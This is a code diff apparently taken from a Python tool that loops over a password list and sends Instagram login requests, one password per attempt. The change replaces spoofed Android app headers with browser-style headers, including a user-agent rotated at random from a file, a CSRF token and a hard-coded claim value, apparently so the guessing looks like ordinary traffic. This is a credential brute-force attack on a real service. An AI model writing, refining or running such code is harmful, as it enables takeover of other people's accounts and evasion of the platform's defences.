@@ -716,7 +716,22 @@ class instagram:
             except (json.decoder.JSONDecodeError,ValueError,KeyError):token = self.generated_csrf_token()
             for pw in pas:
                 headers = {
-                  'Host': 'www.instagram.com', 'x-ig-app-locale': 'in_ID', 'x-ig-device-locale': 'in_ID', 'x-ig-mapped-locale': 'id_ID', 'x-pigeon-session-id': 'UFS-edda2e39-3a78-4bf3-9361-6eca6d4a710b-0', 'x-pigeon-rawclienttime': '1724151571.141', 'x-ig-bandwidth-speed-kbps': '-1.000', 'x-ig-bandwidth-totalbytes-b': '0', 'x-ig-bandwidth-totaltime-ms': '0', 'x-bloks-version-id': '33bf851d4ffa1459309fc7b28463c5d91ffc7aaad80d1c5f9a8a4ed728e319f7', 'x-ig-www-claim': '0', 'x-bloks-is-layout-rtl': 'false', 'x-ig-device-id': '15c63f48-a663-4309-b39b-2b66610234c8', 'x-ig-family-device-id': '3ce1fd28-4c2a-4a04-b241-d5ea0b59451b', 'x-ig-android-id': 'android-9f4d962ca78913a4', 'x-ig-timezone-offset': '25200', 'x-fb-connection-type': 'MOBILE.LTE', 'x-ig-connection-type': 'MOBILE(LTE)', 'x-ig-capabilities': '3brTv10=', 'x-ig-app-id': '567067343352427', 'Priority': 'u=3', 'User-Agent': 'Instagram 249.0.0.20.105 Android (30/11; 440dpi; 1080x2216; Xiaomi/xiaomi; Redmi Note 8; ginkgo; qcom; in_ID; 392286016)', 'Accept-Language': 'id-ID, en-US', 'x-mid': 'ZsR3BAABAAFPXSziZqkMzgBb_gWg', 'ig-intended-user-id': '0', 'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8', 'Content-Length': '327', 'x-fb-http-engine': 'Liger', 'x-fb-client-ip': 'True', 'x-fb-server-cluster': 'True' 'Accept':'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7','Accept-Encoding':'gzip, deflate','Accept-Language':'en-US,en;q=0.9'}
+                  'Host': 'www.instagram.com',
+                'x-ig-www-claim': 'hmac.AR0Ft-pZRNZTzI7hjqy0oNQ3tHwi9IV_Q92-GUDay5ra5_FT',
+                'x-instagram-ajax': '91a4c055cfdf',
+                'content-type': 'application/x-www-form-urlencoded',
+                'accept': '*/*',
+                'user-agent': random.choice(open("ua.txt","r").read().splitlines()),
+                'x-requested-with': 'XMLHttpRequest',
+                'x-csrftoken': crf_token,
+                'x-ig-app-id': '1217981644879628',
+                'origin': 'https://www.instagram.com',
+                'sec-fetch-site': 'same-origin',
+                'sec-fetch-mode': 'cors',
+                'sec-fetch-dest': 'empty',
+                'referer': 'https://www.instagram.com/',
+                'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8'
+            }
 
                 param={
                     "enc_password": f"#PWD_INSTAGRAM_BROWSER:0:{ts}:{pw}",
